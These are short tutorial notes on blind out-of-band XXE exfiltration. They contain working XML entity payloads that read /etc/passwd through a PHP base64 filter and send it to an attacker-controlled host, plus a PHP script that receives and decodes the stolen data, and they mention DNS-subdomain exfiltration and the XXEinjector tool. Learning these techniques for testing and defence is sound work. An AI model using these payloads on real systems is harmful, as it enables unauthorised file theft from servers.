# Blind Data Exfiltration
***

### Out-of-band Data Exfiltration
#### When we don't have anything printed on the web application response, we can use the `Out-of-band (OOB) Data Exfiltration` method.
#### With that method we can make the web application send a web request to out webserver with the content of the file we are reading.

#### In order to do that we can use a parameter entity for the content of the file we are reading , while using PHP filter to base64 encode it, and then we create another external parameter entity and reference it to our ip, and place the `file` parameter value as part of the URL being requested over HTTP:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://My_IP:1337/?content=%file;'>">
```

#### To automatically detect the encoded file content, decode it, and output it to the terminal we can use a simple PHP script:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

#### To perform the complete attack we could use the following payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://MY_IP:1337/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

#### Additionally, to that we may try to perform a `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.my.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic.

### Automated OOB Exfiltration
#### To automate the process of XXE injection tetsing we can use the [XXEinjector](https://github.com/enjoiz/XXEinjector) tool to perform basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.